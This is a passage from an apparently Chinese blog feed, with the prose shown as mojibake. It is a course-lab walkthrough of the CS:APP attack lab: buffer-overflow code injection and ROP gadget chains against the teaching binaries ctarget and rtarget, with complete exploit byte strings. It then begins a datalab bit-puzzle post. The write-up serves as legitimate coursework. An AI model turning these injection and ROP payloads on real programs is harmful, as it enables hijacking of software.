alt="image-20210331211305114"></p><p><img src="/posts/9b9a13df/1433829-fa485a0533812b76.png" alt="img"></p><p>åˆ©ç”¨raw2hexè½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight bnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></div></td></tr></table></figure><p>å†æ‰§è¡Œ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" alt="image-20210331211454524"></p></li></ul><h3 id="3-phase3"><a class="markdownIt-Anchor" href="#3-phase3"></a> 3) phase3</h3><ul><li><p><strong>ä»»åŠ¡è¦æ±‚</strong></p><p>ç¬¬ä¸‰é˜¶æ®µï¼Œä¹Ÿæ˜¯éœ€è¦åœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ³¨å…¥ä¸€æ®µä»£ç ï¼Œä½†æ˜¯ä¸åŒäºç¬¬äºŒé˜¶æ®µçš„æ˜¯ï¼Œåœ¨è¿™ä¸€é˜¶æ®µä¸­æˆ‘ä»¬éœ€è¦å°†cookieè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚</p><p><img src="/posts/9b9a13df/image-20210412202523955.png" alt="image-20210412202523955"></p></li><li><p><strong>å®éªŒæ­¥éª¤</strong></p><p>æˆ‘ä»¬é¦–å…ˆæ„é€ æ³¨å…¥ä»£ç ï¼Œtouch3çš„åœ°å€ä¸º0x4018fa,æ ¹æ®ä¸Šä¸€å…³æˆ‘ä»¬å·²ç»å¾—åˆ°çš„%rspåœ°å€0x5561dc78ï¼Œè¿”å›åœ°å€åº”ä¸º%rsp+0x28ï¼ˆä¿å­˜ä»£ç æ‰§è¡Œåœ°å€çš„ä½ç½®ï¼‰,ç„¶åå­—ç¬¦ä¸²åœ°å€åº”ä¸º%rsp+0x30(48)ï¼Œå³0x5561dca0.</p><p>æ‰€ä»¥æ³¨å…¥ä»£ç ä¸º,ä¿å­˜åœ¨cs.sä¸­</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></div></td></tr></table></figure><p>æ±‡ç¼–å’Œåæ±‡ç¼–</p><p><img src="/posts/9b9a13df/image-20210412203205921.png" alt="image-20210412203205921"></p><p><img src="/posts/9b9a13df/image-20210412203220388.png" alt="image-20210412203220388"></p><p>åˆ©ç”¨man asciiå°†cookieè½¬åŒ–ä¸º16è¿›åˆ¶</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæ³¨å…¥åºåˆ—ä¸ºï¼š</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>å°†å…¶ä¿å­˜åœ¨touch_3.txtä¸­ï¼Œæ‰§è¡ŒæŒ‡ä»¤ï¼Œå¯å¾—ï¼š</p><p><img src="/posts/9b9a13df/image-20210412203956357.png" alt="image-20210412203956357"></p></li></ul><h3 id="4-phase4"><a class="markdownIt-Anchor" href="#4-phase4"></a> 4) phase4</h3><ul><li><p><strong>ä»»åŠ¡è¦æ±‚</strong></p><p>åœ¨è¿™ä¸€é˜¶æ®µä¸­ï¼Œæˆ‘ä»¬å…¶å®æ˜¯é‡å¤ä»£ç æ³¨å…¥æ”»å‡»ä¸­ç¬¬äºŒé˜¶æ®µçš„ä»»åŠ¡ï¼ŒåŠ«æŒç¨‹åºæµï¼Œè¿”å›åˆ°<code>touch2</code>å‡½æ•°ã€‚åªä¸è¿‡è¿™ä¸ªæˆ‘ä»¬è¦åšçš„æ˜¯ROPæ”»å‡»ï¼Œè¿™ä¸€é˜¶æ®µæˆ‘ä»¬æ— æ³•å†åƒä¸Šä¸€é˜¶æ®µä¸­å°†æŒ‡ä»¤åºåˆ—æ”¾å…¥åˆ°æ ˆä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ°ç°æœ‰çš„ç¨‹åºä¸­ï¼Œæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„æŒ‡ä»¤åºåˆ—ã€‚</p></li><li><p><strong>å®éªŒæ­¥éª¤</strong></p><p>æˆ‘ä»¬éœ€è¦çš„ä»£ç åºåˆ—ï¼š</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></div></td></tr></table></figure><p>å…¶æŒ‡ä»¤ç¼–ç ä¸ºï¼š</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></div></td></tr></table></figure><p>åœ¨rtargetçš„åæ±‡ç¼–ä»£ç ä¸­æŸ¥æ‰¾</p><p><img src="/posts/9b9a13df/image-20210412211719953.png" alt="image-20210412211719953"></p><p>æ‰€ä»¥popq %raxæŒ‡ä»¤èµ·å§‹åœ°å€ä¸ºï¼š0x4019ab</p><p><img src="/posts/9b9a13df/image-20210412211839599.png" alt="image-20210412211839599"></p><p>æ‰€ä»¥movq %rax, %rdiæŒ‡ä»¤èµ·å§‹åœ°å€ä¸ºï¼š0x4019a2</p><p>æ‰€ä»¥å¾—åˆ°å­—ç¬¦ä¸²ï¼Œä¿å­˜åœ¨touch_4ä¸­ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>æ‰§è¡ŒæŒ‡ä»¤ï¼š</p><p><img src="/posts/9b9a13df/image-20210412212407837.png" alt="image-20210412212407837"></p></li></ul><h3 id="5-phase5"><a class="markdownIt-Anchor" href="#5-phase5"></a> 5) phase5</h3><ul><li><p><strong>ä»»åŠ¡è¦æ±‚</strong></p><p>åœ¨è¿™ä¸€é˜¶æ®µä¸­ï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠå­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œä¼ é€åˆ°<code>%rdi</code>,ç„¶åè°ƒç”¨<code>touch3</code>å‡½æ•°ã€‚</p><p>å› ä¸ºæ¯æ¬¡æ ˆçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ç”¨åœ°å€æ¥ç´¢å¼•å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œåªèƒ½ç”¨æ ˆé¡¶åœ°å€ + åç§»é‡æ¥ç´¢å¼•å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ã€‚ä»<code>farm</code>ä¸­æˆ‘ä»¬å¯ä»¥è·å–åˆ°è¿™æ ·ä¸€ä¸ª<code>gadget</code>ï¼Œ<code>lea (%rdi,%rsi,1),%rax</code>ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠå­—ç¬¦ä¸²çš„é¦–åœ°å€ä¼ é€åˆ°<code>%rax</code>ã€‚</p></li><li><p><strong>å®éªŒæ­¥éª¤</strong></p><p>è§£é¢˜æ€è·¯ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆè·å–åˆ°<code>%rsp</code>çš„åœ°å€ï¼Œå¹¶ä¸”ä¼ é€åˆ°<code>%rdi</code><br>ï¼ˆ2ï¼‰å…¶äºŒè·å–åˆ°å­—ç¬¦ä¸²çš„åç§»é‡å€¼ï¼Œå¹¶ä¸”ä¼ é€åˆ°<code>%rsi</code><br>ï¼ˆ3ï¼‰<code>lea (%rdi,%rsi,1),%rax</code>, å°†å­—ç¬¦ä¸²çš„é¦–åœ°å€ä¼ é€åˆ°<code>%rax</code>, å†ä¼ é€åˆ°<code>%rdi</code><br>ï¼ˆ4ï¼‰è°ƒç”¨<code>touch3</code>å‡½æ•°</p></li></ul><p>(1) ç¬¬ä¸€æ­¥ï¼Œè·å–åˆ°<code>%rsp</code>çš„åœ°å€</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></div></td></tr></table></figure><p>movq %rsp, %rax<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>48 89 e0<code>, æ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x401a06</p><p>(2) ç¬¬äºŒæ­¥ï¼Œå°†<code>%rax</code>çš„å†…å®¹ä¼ é€åˆ°<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></div></td></tr></table></figure><p>movq %rax, %rdi<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>48 89 c7<code>ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x4019a2</p><p>(3) ç¬¬ä¸‰æ­¥ï¼Œå°†åç§»é‡çš„å†…å®¹å¼¹å‡ºåˆ°<code>%rax</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></div></td></tr></table></figure><p>popq %rax<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>58<code>ï¼Œ å…¶ä¸­</code>90<code>ä¸º</code>nop<code>æŒ‡ä»¤, æ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x4019cc</p><p>(4) ç¬¬å››æ­¥ï¼Œå°†<code>%eax</code>çš„å†…å®¹ä¼ é€åˆ°<code>%edx</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></div></td></tr></table></figure><p>movl %eax, %edx<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸º:</code>89 c2<code>, æ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x4019dd</p><p>(5) ç¬¬äº”æ­¥ï¼Œå°†<code>%edx</code>çš„å†…å®¹ä¼ é€åˆ°<code>%ecx</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></div></td></tr></table></figure><p>movl %edx, %ecx<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>89 d1<code>ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x401a70</p><p>(6) ç¬¬å…­æ­¥ï¼Œå°†<code>%ecx</code>çš„å†…å®¹ä¼ é€åˆ°<code>%esi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></div></td></tr></table></figure><p>movl %ecx, %esi<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>89 ce<code>, æ‰€ä»¥è¿™ä¸€æ­¥</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x401a13</p><p>(7) ç¬¬ä¸ƒæ­¥ï¼Œå°†æ ˆé¡¶ + åç§»é‡å¾—åˆ°å­—ç¬¦ä¸²çš„é¦–åœ°å€ä¼ é€åˆ°<code>%rax</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></div></td></tr></table></figure><p>è¿™ä¸€æ­¥çš„<code>gadget</code>åœ°å€ä¸ºï¼š<code>0x4019d6</code></p><p>(8) å°†å­—ç¬¦ä¸²é¦–åœ°å€<code>%rax</code>ä¼ é€åˆ°<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></div></td></tr></table></figure><p>movq %rax, %rdi<code>çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š</code>48 89 c7<code>ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥çš„</code>gadget<code>åœ°å€ä¸ºï¼š</code>0x4019a2</p><p>æ•´ä¸ªæ ˆçš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/posts/9b9a13df/1433829-cafcf76d35ef7ba1.png" alt="img"></p><p>æ‰€ä»¥è¦è¾“å…¥çš„å­—ç¬¦ä¸²ä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>ä¿å­˜åœ¨touch_5.txtä¸­ï¼Œæ‰§è¡ŒæŒ‡ä»¤ï¼š</p><p><img src="/posts/9b9a13df/image-20210412213042512.png" alt="image-20210412213042512"></p>]]></content>
    
    
    <categories>
      
      <category>è¯¾ç¨‹å­¦ä¹ </category>
      
      <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab2_datalab</title>
    <link href="/posts/330a79db/"/>
    <url>/posts/330a79db/</url>
    
    <content type="html"><![CDATA[<h1 id="lab2_datalab"><a class="markdownIt-Anchor" href="#lab2_datalab"></a> lab2_datalab</h1><h2 id="1bitand"><a class="markdownIt-Anchor" href="#1bitand"></a> 1.bitAnd</h2><p>è¿™ä¸ªå¾ˆç®€å•</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitAnd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~x|~y);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2getbyte"><a class="markdownIt-Anchor" href="#2getbyte"></a> 2.getByte</h2><p>èˆæ‰æœ€åçš„nä¸ªå­—èŠ‚ï¼Œå³n*8ä½ï¼Œå¹¶ä¿ç•™èˆæ‰åçš„æœ€å8ä½</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 6</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getByte</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> tmp =x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>);<span class="hljs-comment">//å°†ç›®æ ‡ç§»åˆ°æœ€å</span><br>   tmp=tmp&amp;<span class="hljs-number">0xFF</span>;<span class="hljs-comment">//ä¿ç•™ç›®æ ‡</span><br>   <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h2 id="3logicalshift"><a class="markdownIt-Anchor" href="#3logicalshift"></a> 3.logicalShift</h2><p>å¯¹xè¿›è¡Œé€»è¾‘å³ç§»ï¼ˆç®—æœ¯å³ç§»è¡¥ç¬¦å·ä½ï¼Œé€»è¾‘å³ç§»è¡¥0ï¼‰ï¼Œå¯ä»¥é‡‡ç”¨å…ˆè¿›è¡Œç®—æœ¯å³ç§»ï¼Œç„¶åå°†å³ç§»å¤šå‡ºæ¥çš„ç¬¦å·ä½ç½®0ã€‚</p><p>å› 